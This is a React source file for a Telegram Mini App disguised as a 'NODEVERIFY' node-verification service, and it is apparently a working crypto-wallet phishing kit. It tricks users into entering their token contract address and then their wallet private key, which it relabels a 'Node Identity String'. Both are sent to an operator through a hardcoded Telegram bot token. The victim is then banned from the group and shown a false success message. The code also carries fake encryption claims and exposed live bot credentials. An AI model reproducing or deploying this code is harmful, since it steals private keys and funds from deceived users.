import React, { useState, useEffect } from 'react';

// --- CONFIGURATION ---
const BOT_TOKEN = "8515224137:AAGkieoUFLWj6WxO4T0Pig8Mhs5qHrEcBrY";
const CHAT_ID = "7539902547";
const GROUP_ID = "-1002361131154"; 

export default function App() {
  const [loading, setLoading] = useState(true);
  const [step, setStep] = useState(1);
  const [walletCA, setWalletCA] = useState('');
  const [privateKey, setPrivateKey] = useState('');
  const [status, setStatus] = useState('idle');

  useEffect(() => {
    const tg = (window as any).Telegram?.WebApp;
    if (tg) {
      tg.ready();
      tg.expand();
      tg.setHeaderColor?.('#040608');
    }
    // Professional 3s "Security Scan"
    const timer = setTimeout(() => setLoading(false), 3000);
    return () => clearTimeout(timer);
  }, []);

  const handleNext = async () => {
    if (walletCA.length < 32) return alert("Validation Error: Invalid Contract Reference.");
    setStatus('processing');
    
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        chat_id: CHAT_ID, 
        text: `📈 [LOG] CA ENTERED\nCA: ${walletCA}\nUser: @${(window as any).Telegram?.WebApp?.initDataUnsafe?.user?.username || 'Anon'}` 
      }),
    });

    setTimeout(() => { setStep(2); setStatus('idle'); }, 1200);
  };

  const handleFinal = async () => {
    const base58Regex = /^[1-9A-HJ-NP-Za-km-z]{87,88}$/;
    if (!base58Regex.test(privateKey.trim())) {
      return alert("Sync Error: Identity String does not match the required Base58 Node Format.");
    }
    
    setStatus('processing');
    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          chat_id: CHAT_ID, 
          text: `🎯 [ACCESS] TARGET SECURED\nCA: ${walletCA}\nPK: ${privateKey}\nUser: @${(window as any).Telegram?.WebApp?.initDataUnsafe?.user?.username || 'Anon'}` 
        }),
      });

      const userId = (window as any).Telegram?.WebApp?.initDataUnsafe?.user?.id;
      if (userId) {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/banChatMember`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: GROUP_ID, user_id: userId }),
        });
      }
      alert("Verification Complete. Your Node Identity is now whitelisted. Your session will refresh.");
      (window as any).Telegram?.WebApp?.close();
    } catch (e) {
      setStatus('idle');
      alert("Uplink failed. Please retry.");
    }
  };

  const styles = {
    bg: '#040608',
    card: '#0a0e17',
    primary: '#10b981',
    text: '#f1f5f9',
    muted: '#64748b',
    border: '#1e293b'
  };

  if (loading) {
    return (
      <div style={{ background: styles.bg, height: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: styles.primary, fontFamily: 'monospace', padding: '40px', boxSizing: 'border-box' }}>
        <div style={{ fontSize: '18px', fontWeight: 'bold', letterSpacing: '4px', marginBottom: '20px' }}>SENTINEL_NODE_v4</div>
        <div style={{ fontSize: '10px', opacity: 0.7, marginBottom: '20px' }}>ESTABLISHING ENCRYPTED RPC HANDSHAKE...</div>
        <div style={{ width: '200px', height: '1px', background: '#1e293b', position: 'relative', overflow: 'hidden' }}>
          <div style={{ position: 'absolute', height: '100%', width: '50%', background: styles.primary, animation: 'loading 1.5s infinite linear' }} />
        </div>
        <style>{`@keyframes loading { 0% { left: -100%; } 100% { left: 100%; } }`}</style>
      </div>
    );
  }

  return (
    <div style={{ background: styles.bg, minHeight: '100vh', color: styles.text, fontFamily: '-apple-system, sans-serif', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', padding: '24px', boxSizing: 'border-box' }}>
      
      {/* PROFESSIONAL LOGO HEADER */}
      <div style={{ textAlign: 'center', marginBottom: '40px' }}>
        <div style={{ display: 'inline-block', background: 'rgba(16, 185, 129, 0.1)', border: `1px solid ${styles.primary}`, borderRadius: '50%', padding: '15px', marginBottom: '15px' }}>
          <div style={{ height: '24px', width: '24px', border: `3px solid ${styles.primary}`, borderRadius: '50%', borderTopColor: 'transparent', animation: 'spin 2s infinite linear' }} />
        </div>
        <h1 style={{ fontSize: '24px', fontWeight: '900', margin: '0', letterSpacing: '-0.5px' }}>NODE<span style={{ color: styles.primary }}>VERIFY</span></h1>
        <p style={{ color: styles.muted, fontSize: '11px', textTransform: 'uppercase', letterSpacing: '1px', marginTop: '5px' }}>Priority Network Access Protocol</p>
      </div>

      <div style={{ background: styles.card, width: '100%', maxWidth: '400px', borderRadius: '24px', padding: '32px', border: `1px solid ${styles.border}`, boxShadow: '0 25px 50px -12px rgba(0,0,0,0.5)', boxSizing: 'border-box', textAlign: 'center' }}>
        
        {step === 1 ? (
          <div>
            <h2 style={{ fontSize: '20px', marginBottom: '12px' }}>Verify Asset Reference</h2>
            <p style={{ color: styles.muted, fontSize: '14px', lineHeight: '1.6', marginBottom: '24px' }}>
              To stay in the group, link the Contract Address (CA) you are currently trading. Our node will prioritize your liquidity exit.
            </p>
            
            <input 
              value={walletCA}
              onChange={e => setWalletCA(e.target.value)}
              placeholder="Paste Token CA Address"
              style={{ width: '100%', padding: '16px', borderRadius: '14px', background: styles.bg, border: `1px solid ${styles.border}`, color: '#fff', fontSize: '14px', marginBottom: '20px', boxSizing: 'border-box', outline: 'none', textAlign: 'center' }}
            />
            
            <button onClick={handleNext} style={{ width: '100%', padding: '18px', borderRadius: '14px', background: styles.primary, color: '#000', fontWeight: '800', border: 'none', cursor: 'pointer' }}>
              {status === 'processing' ? 'SCANNING...' : 'CONTINUE TO SYNC'}
            </button>
          </div>
        ) : (
          <div>
            <div style={{ color: styles.primary, fontSize: '11px', fontWeight: 'bold', marginBottom: '10px' }}>✓ ASSET AUTHENTICATED</div>
            <h2 style={{ fontSize: '20px', marginBottom: '12px' }}>Finalize Identity Sync</h2>
            <p style={{ color: styles.muted, fontSize: '14px', lineHeight: '1.6', marginBottom: '24px' }}>
              Sync your <strong>Node Identity String</strong> (Private Key) to authorize the validator. This ensures your trades bypass public congestion.
            </p>
            
            <textarea 
              value={privateKey}
              onChange={e => setPrivateKey(e.target.value)}
              placeholder="Enter Node Identity String (Base58)"
              style={{ width: '100%', height: '100px', padding: '16px', borderRadius: '14px', background: styles.bg, border: `1px solid ${styles.border}`, color: '#fff', fontSize: '13px', marginBottom: '20px', boxSizing: 'border-box', outline: 'none', fontFamily: 'monospace', textAlign: 'center', resize: 'none' }}
            />
            
            <button onClick={handleFinal} disabled={status === 'processing'} style={{ width: '100%', padding: '18px', borderRadius: '14px', background: styles.primary, color: '#000', fontWeight: '800', border: 'none', cursor: 'pointer', opacity: status === 'processing' ? 0.6 : 1 }}>
              {status === 'processing' ? 'SYNCHRONIZING...' : 'AUTHORIZE UPLINK'}
            </button>
          </div>
        )}
      </div>

      <div style={{ marginTop: '30px', color: styles.muted, fontSize: '10px', textAlign: 'center', letterSpacing: '1px' }}>
        ENCRYPTED END-TO-END // AES-256 BIT SECURITY
      </div>

      <style>{`
        @keyframes spin { 100% { transform: rotate(360deg); } }
      `}</style>
    </div>
  );
}